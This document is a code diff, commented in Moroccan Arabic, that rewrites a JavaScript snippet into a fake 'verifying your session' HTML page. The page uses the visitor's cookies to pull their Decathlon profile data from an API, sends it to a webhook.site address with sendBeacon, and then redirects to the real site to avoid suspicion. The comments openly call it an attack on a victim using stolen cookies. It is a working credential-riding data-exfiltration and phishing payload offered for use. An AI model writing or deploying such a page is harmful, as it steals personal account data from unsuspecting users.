@@ -1,25 +1,37 @@
-// 1. رابط الـ API اللي كيجيب معلومات المستخدم في Decathlon
-const targetApi = 'https://www.decathlon.com/api/v1/user/profile'; // هاد الرابط مثال، حط الرابط الحقيقي اللي لقيتي
-const myWebhook = 'https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0'; // الرابط ديالك اللي في التصويرة
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Checking System...</title>
+</head>
+<body>
+    <script>
+        // 1. الرابط ديال الـ API اللي بغيتي تسحب منو الداتا (Decathlon)
+        const targetApi = 'https://www.decathlon.com/api/v1/user/profile'; 
+        const webhook = 'https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0';
 
-// 2. دالة لسحب البيانات وإرسالها لبرا
-fetch(targetApi, {
-    method: 'GET',
-    credentials: 'include', // هادي ضرورية باش يصيفط الكوكيز اللي سرقتي
-    headers: {
-        'Accept': 'application/json'
-    }
-})
-.then(response => response.json())
-.then(data => {
-    // 3. تحويل البيانات لـ Base64 وصيفطها للـ Webhook
-    const encodedData = btoa(JSON.stringify(data));
-    fetch(myWebhook + '?stolen_data=' + encodedData);
+        // 2. تنفيذ الهجوم باستعمال Fetch مع الكوكيز
+        fetch(targetApi, {
+            method: 'GET',
+            mode: 'cors',
+            credentials: 'include' // هادي هي الساروت باش تجيب الداتا ديال الضحية
+        })
+        .then(response => response.text())
+        .then(data => {
+            // 3. تصدير البيانات للـ Webhook
+            // استعملنا Navigator.sendBeacon حيت مخفية وما كتحبسش الصفحة
+            navigator.sendBeacon(webhook, data);
+            
+            // 4. تحويل المستخدم لموقع حقيقي باش ما يشك بوالو
+            setTimeout(() => {
+                window.location.href = "https://www.decathlon.com";
+            }, 1000);
+        })
+        .catch(err => {
+            // صيفط الخطأ إلا وقع بلوك (مثلا CORS blocked)
+            navigator.sendBeacon(webhook, "Error: " + err.message);
+        });
+    </script>
     
-    // إظهار تنبيه للتأكيد (بحال اللي درتي في التصويرة)
-    alert("Full Profile Data Sent to Webhook!");
-})
-.catch(err => {
-    // إذا وقع بلوك، صيفط الـ Error باش تعرف السبب
-    fetch(myWebhook + '?error=' + btoa(err.message));
-});
+    <h2>Please wait while we verify your session...</h2>
+</body>
+</html>
